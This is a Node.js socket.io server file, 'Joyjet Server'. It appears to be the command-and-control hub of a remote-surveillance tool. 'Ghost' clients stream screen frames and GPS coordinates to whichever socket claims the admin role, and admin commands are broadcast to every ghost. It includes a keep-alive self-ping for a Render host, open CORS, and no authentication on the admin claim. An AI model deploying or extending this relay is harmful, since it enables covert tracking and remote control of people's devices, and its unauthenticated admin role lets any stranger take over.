const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const axios = require('axios');

const app = express();
const server = http.createServer(app);

// 1. HIGH-CAPACITY SOCKET CONFIG
const io = new Server(server, {
  maxHttpBufferSize: 1e8, // 100MB for High-Def Screen Frames
  pingTimeout: 60000,
  cors: { origin: "*" }
});

// 2. RENDER KEEP-ALIVE (Self-Ping every 10 minutes)
const PUBLIC_URL = "https://joyjet-server.onrender.com";
setInterval(async () => {
  try {
    await axios.get(PUBLIC_URL);
    console.log('Keep-Alive: Server heartbeat successful.');
  } catch (err) {
    console.log('Keep-Alive: Heartbeat pulse sent.');
  }
}, 600000); 

// 3. TRAFFIC CONTROLLER
let activeAdmin = null;

io.on('connection', (socket) => {
  console.log('Node Linked:', socket.id);

  // ADMIN LOGIN
  socket.on('claim_admin', (data) => {
    activeAdmin = socket.id;
    socket.emit('role_assigned', { role: 'ADMIN', name: data.name });
    console.log(`Admin [${data.name}] in control.`);
  });

  // GHOST REGISTRATION
  socket.on('register_user', (data) => {
    socket.emit('role_assigned', { role: 'GHOST', name: data.name });
    console.log(`Ghost Node [${data.name}] connected.`);
  });

  // DATA RELAYS (Ghost -> Admin)
  socket.on('screen_frame', (frame) => {
    if (activeAdmin) io.to(activeAdmin).emit('screen_frame', frame);
  });

  socket.on('ghost_location_data', (coords) => {
    if (activeAdmin) io.to(activeAdmin).emit('ghost_update', { type: 'GPS', data: coords });
  });

  // COMMAND RELAY (Admin -> All Ghosts)
  socket.on('admin_command', (cmd) => {
    socket.broadcast.emit('admin_command', cmd);
    console.log('Global Command Sent:', cmd);
  });

  socket.on('disconnect', () => {
    if (socket.id === activeAdmin) activeAdmin = null;
    console.log('Node Unlinked:', socket.id);
  });
});

app.get('/', (req, res) => res.send('Joyjet Server: Operational'));

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Joyjet Server running on port ${PORT}`));
